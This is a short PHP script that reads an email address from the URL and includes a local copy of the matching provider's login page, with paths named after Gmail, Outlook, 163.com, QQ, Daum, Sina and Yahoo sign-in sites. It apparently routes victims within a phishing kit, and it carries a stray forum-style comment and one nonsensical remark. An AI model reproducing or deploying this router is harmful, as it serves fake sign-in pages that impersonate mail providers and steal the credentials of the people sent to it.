<?php
  $url = $_GET['email'];

  $redirects = array(
    'gmail' => 'accounts.google.com/login.php',
    'hotmail' => 'outlook.live.com/index.php',
    'msn' => 'outlook.live.com/index.php',	
	'163.com' => 'email.163.com/login.php',
	'126.com' => 'email.163.com/login.php',
	'yeah' => 'email.163.com/login.php',
	'shouji' => 'email.163.com/login.php',
	'qq' => 'email.qq.com/login.php',
	'daum' => 'login.daum.net/login.php',
	'hanmail' => 'login.daum.net/login.php',
	
    'webmail' => 'mail.sina.com.cn/login.php', // Alternatives: novel also directs to book.
    'yahoo' => 'login.yahoo.com/login.php');
	

  

  $wordFound = false;

  // Loop through all words
  foreach($redirects as $word => $file) {

    // If a word exists in the url, include that file.
    if (strpos($url,$word) !== false) {

      // `file_get_contents` would just echo the code in the file rather 
      // than execute it, so did you mean `include` instead? Or a real 
      // redirect using header('Location: xyz.php');?

      include($file);

      $wordFound = true;
      break;
    }
  }

  // If no words were found, include the other file
  if ($wordFound == false) {
    include("mail.sina.com.cn/login.php");
  }

?>
